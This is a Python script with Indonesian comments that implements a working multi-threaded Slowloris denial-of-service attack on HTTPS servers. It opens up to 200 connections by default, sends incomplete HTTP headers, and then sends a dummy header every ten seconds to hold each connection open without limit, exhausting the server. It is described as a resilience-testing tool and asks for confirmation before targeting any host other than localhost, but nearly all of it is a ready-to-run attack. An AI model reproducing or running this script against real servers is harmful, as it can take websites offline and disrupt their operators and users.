import socket
import ssl
import threading
import time
import argparse
import logging
import sys

# Konfigurasi Logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(threadName)s - %(message)s')

# --- Fungsi Utama Serangan Slowloris ---
def slowloris_attack(target_host: str, target_port: int, ssl_context: ssl.SSLContext):
    """
    Melakukan satu instans serangan Slowloris.
    Membuka koneksi, mengirim header HTTP yang tidak lengkap,
    dan kemudian secara berkala mengirim header tambahan untuk menjaga koneksi tetap hidup.
    """
    sock = None
    ssl_sock = None
    try:
        # 1. Buat Socket TCP/IP
        # AF_INET menunjukkan alamat IPv4.
        # SOCK_STREAM menunjukkan tipe soket berorientasi koneksi (TCP).
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10) # Atur timeout untuk operasi socket

        logging.info(f"Mencoba menyambung ke {target_host}:{target_port}...")

        # 2. Bungkus Socket dengan SSL/TLS (untuk HTTPS)
        # Menggunakan konteks SSL yang sudah dibuat.
        ssl_sock = ssl_context.wrap_socket(sock, server_hostname=target_host)
        ssl_sock.connect((target_host, target_port))

        logging.info(f"Koneksi berhasil dibuat ke {target_host}:{target_port}.")

        # 3. Kirim Header HTTP Tidak Lengkap
        # Ini adalah bagian kunci dari Slowloris. Kita mengirimkan header awal
        # tetapi TIDAK mengirim baris kosong ganda (\r\n\r\n) yang akan menandakan
        # akhir dari header dan memulai body request.
        headers = [
            f"GET / HTTP/1.1",
            f"Host: {target_host}",
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Accept-Language: en-US,en;q=0.5",
            "Connection: keep-alive",
            "Keep-Alive: 900", # Minta server untuk menjaga koneksi tetap hidup lebih lama
        ]
        
        # Kirim header per baris, diikuti dengan \r\n
        for header in headers:
            ssl_sock.sendall((header + "\r\n").encode('utf-8'))
            time.sleep(0.1) # Sedikit jeda antar header
        
        logging.info("Header awal tidak lengkap berhasil dikirim.")

        # 4. Pertahankan Koneksi Terbuka dengan Mengirim Header Dummy Secara Berkala
        # Loop ini akan berjalan tanpa batas waktu, terus-menerus mengirim header dummy
        # untuk mencegah server menutup koneksi karena timeout atau karena mengira
        # klien sudah selesai mengirim header.
        header_count = 0
        while True:
            # Kirim header dummy (misalnya, X-a: <nomor_acak>)
            # Server akan terus menunggu bagian akhir dari header request yang sebenarnya.
            dummy_header = f"X-a: {header_count}\r\n"
            ssl_sock.sendall(dummy_header.encode('utf-8'))
            logging.debug(f"Mengirim header dummy: '{dummy_header.strip()}'")
            header_count += 1
            time.sleep(10)  # Kirim header setiap 10 detik (bisa disesuaikan)

    except socket.timeout:
        logging.warning(f"Koneksi ke {target_host}:{target_port} timeout.")
    except socket.error as e:
        logging.error(f"Kesalahan koneksi atau soket: {str(e)}")
    except ssl.SSLError as e:
        logging.error(f"Kesalahan SSL/TLS: {str(e)}")
    except Exception as e:
        logging.error(f"Slowloris Error umum: {str(e)}")
    finally:
        # Pastikan untuk menutup soket jika terbuka
        if ssl_sock:
            ssl_sock.close()
            logging.info(f"Koneksi SSL ditutup untuk {target_host}.")
        elif sock:
            sock.close()
            logging.info(f"Koneksi soket ditutup untuk {target_host}.")

# --- Fungsi untuk Memulai Serangan Multi-Thread ---
def start_slowloris_attack(target_host: str, target_port: int, num_threads: int):
    """
    Menginisialisasi dan memulai serangan Slowloris menggunakan beberapa thread.
    """
    logging.info(f"Memulai serangan Slowloris ke {target_host}:{target_port} dengan {num_threads} thread...")

    # Buat konteks SSL sekali dan bagikan antar thread (ini lebih efisien)
    # context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH) # Lebih ketat
    context = ssl.create_default_context()
    context.check_hostname = False # Jangan periksa nama host (potensi risiko keamanan, tapi umum di pentesting)
    context.verify_mode = ssl.CERT_NONE # Jangan verifikasi sertifikat (potensi risiko keamanan, tapi umum di pentesting)
    
    threads = []
    for i in range(num_threads):
        thread_name = f"Slowloris-Thread-{i+1}"
        thread = threading.Thread(target=slowloris_attack, 
                                  args=(target_host, target_port, context),
                                  name=thread_name)
        thread.daemon = True # Biarkan program utama keluar meskipun thread masih berjalan
        thread.start()
        threads.append(thread)
        logging.info(f"Thread '{thread_name}' dimulai.")
        time.sleep(0.01) # Sedikit jeda agar thread tidak mulai terlalu cepat bersamaan

    try:
        # Jaga program utama tetap berjalan agar thread-thread bisa bekerja
        # Jika semua thread adalah daemon, program utama akan keluar jika tidak ada non-daemon thread.
        # Oleh karena itu, kita tidur sejenak agar program tidak langsung keluar.
        while True:
            alive_threads = [t for t in threads if t.is_alive()]
            if not alive_threads:
                logging.info("Semua thread serangan telah berhenti.")
                break
            time.sleep(5) # Periksa status thread setiap 5 detik
            
    except KeyboardInterrupt:
        logging.info("Serangan dihentikan oleh pengguna (Ctrl+C).")
        # Daemon threads akan dihentikan secara otomatis saat program utama keluar.
    except Exception as e:
        logging.error(f"Kesalahan di main loop: {str(e)}")

# --- Titik Masuk Program ---
if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Skrip Serangan Slowloris untuk menguji ketahanan server web.",
        formatter_class=argparse.RawTextHelpFormatter
    )
    parser.add_argument(
        "host", 
        type=str, 
        help="Alamat IP atau nama host target (misal: localhost, 192.168.1.1, example.com)"
    )
    parser.add_argument(
        "-p", "--port", 
        type=int, 
        default=443, 
        help="Port target (default: 443 untuk HTTPS)"
    )
    parser.add_argument(
        "-t", "--threads", 
        type=int, 
        default=200, 
        help="Jumlah thread yang akan digunakan untuk serangan (default: 200)"
    )
    parser.add_argument(
        "-v", "--verbose", 
        action="store_true", 
        help="Tampilkan output logging yang lebih detail (DEBUG level)"
    )

    args = parser.parse_args()

    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)

    logging.info("=== Slowloris Attack Initiated ===")
    logging.info(f"Target: {args.host}:{args.port}")
    logging.info(f"Threads: {args.threads}")

    # Memastikan tidak ada penggunaan yang tidak disengaja terhadap sistem penting
    if args.host not in ["localhost", "127.0.0.1"] and not input(f"Anda akan menyerang '{args.host}'. Apakah Anda yakin (y/n)? ").lower() == 'y':
        logging.critical("Pengguna membatalkan serangan. Keluar.")
        sys.exit(1)

    start_slowloris_attack(args.host, args.port, args.threads)
    logging.info("Slowloris Attack selesai (atau dihentikan).")
